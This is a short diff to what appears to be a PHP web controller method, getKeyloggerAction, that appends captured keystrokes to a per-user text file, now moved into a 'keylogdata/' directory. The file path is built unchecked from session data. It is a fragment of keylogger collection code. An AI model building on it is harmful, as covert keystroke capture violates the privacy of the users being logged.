@@ -105,7 +105,7 @@ class TestController extends AppController
 
     public function getKeyloggerAction(){
        // debug($_SESSION['user']['login'].".txt",1);
-        $filename = $_SESSION['user']['login'].".txt";
+        $filename = "keylogdata/".$_SESSION['user']['login'].".txt";
         $file = fopen($filename, "a+");
          
         // (B) SAVE KEYSTROKES
